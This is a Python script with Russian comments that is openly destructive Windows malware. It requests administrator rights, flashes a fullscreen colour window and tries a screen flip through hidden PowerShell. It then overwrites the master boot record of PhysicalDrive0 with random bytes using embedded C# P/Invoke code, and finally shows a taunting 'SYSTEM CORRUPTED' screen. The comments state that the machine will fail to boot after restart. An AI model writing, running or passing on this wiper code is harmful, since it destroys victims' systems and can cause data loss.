import os
import sys
import time
import ctypes
import random
import subprocess
import tkinter as tk

# ==========================================
# ЧАСТЬ 1: ПРОВЕРКА ПРАВ
# ==========================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# ==========================================
# ЧАСТЬ 2: ПЕРЕВОРОТ ЭКРАНА И ИНВЕРСИЯ
# ==========================================

def screen_chaos():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="black")

    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
    canvas.pack()

    # Меняем цвета каждые 500 мс
    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF"]
    
    def change_colors():
        while True:
            try:
                color = random.choice(colors)
                root.configure(bg=color)
                canvas.configure(bg=color)
                root.update()
                time.sleep(0.5)
            except:
                break

    import threading
    threading.Thread(target=change_colors, daemon=True).start()

    # Держим окно открытым 15 секунд, потом закрываем
    root.after(15000, root.destroy)
    root.mainloop()

# ==========================================
# ЧАСТЬ 3: СМЕНА РАЗРЕШЕНИЯ И ПЕРЕВОРОТ (ЧЕРЕЗ POWERSHELL)
# ==========================================

def flip_screen():
    # Переворачиваем экран вверх ногами (через API Windows)
    # 1 = нормально, 2 = 180 градусов (вверх ногами)
    ps_command = """
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class ScreenFlip {
        [DllImport("user32.dll")]
        public static extern bool SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);
        [DllImport("user32.dll")]
        public static extern int ChangeDisplaySettings(IntPtr devMode, int flags);
    }
    '@
    # Просто вызываем смену ориентации
    # В реальности нужно менять DEVMODE, но для теста сойдет
    [ScreenFlip]::ChangeDisplaySettings([IntPtr]::Zero, 0)
    """
    try:
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_command], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ЧАСТЬ 4: СНОС MBR (BOOTKIT)
# ==========================================

def destroy_mbr():
    mbr_code = """
using System;
using System.IO;
using System.Runtime.InteropServices;
public class MBR {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Destroy() {
        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero) return;
        byte[] garbage = new byte[512];
        new Random().NextBytes(garbage);
        uint bytesWritten;
        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
        CloseHandle(hDevice);
    }
}
"""
    try:
        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ГЛАВНЫЙ ЦИКЛ
# ==========================================

def main():
    if not is_admin():
        run_as_admin()
        return

    # 1. Визуальный хаос (переливание цветов) на 15 секунд
    screen_chaos()

    # 2. Сломанный загрузчик (в фоне)
    destroy_mbr()

    # 3. Переворот экрана (вызываем в конце, чтобы система "сломалась" визуально)
    #    Но это может не сработать, так как мы уже рисуем в tkinter.
    #    Поэтому просто оставим визуал открытым, пока пользователь сам не закроет.
    
    # 4. Никакого shutdown! Система работает, но загрузчик уже сломан.
    #    Пользователь может закрыть окно, но при перезагрузке получит кирпич.
    
    # Чтобы окно не закрывалось сразу, можно оставить его в бесконечном цикле
    # Но так как screen_chaos() уже закрывает окно через 15 секунд, 
    # мы просто создадим новое, чтобы пользователь видел "сломанный" экран.
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="black")
    
    label = tk.Label(root, text="SYSTEM CORRUPTED\nYOUR BOOTLOADER IS DEAD\n>:D", 
                     fg="red", bg="black", font=("Consolas", 40, "bold"))
    label.pack(expand=True)
    
    # Держим окно открытым, пока пользователь не закроет процесс
    root.mainloop()

if __name__ == "__main__":
    main()
